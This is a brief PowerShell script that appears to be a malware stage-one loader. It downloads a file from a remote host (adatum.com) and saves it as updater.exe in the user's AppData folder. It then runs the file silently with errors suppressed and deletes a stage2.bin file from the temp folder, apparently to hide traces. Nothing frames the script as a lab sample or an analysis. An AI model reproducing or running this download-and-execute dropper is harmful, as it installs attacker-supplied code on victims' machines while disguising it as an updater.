[CmdletBinding()]
param(
    [string]$Stage2Url = 'http://adatum.com/update.dat',
    [string]$DropPath = "$env:APPDATA\updater.exe"
)
(New-Object System.Net.WebClient).DownloadFile($Stage2Url, $DropPath)
Start-Process -FilePath $DropPath -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
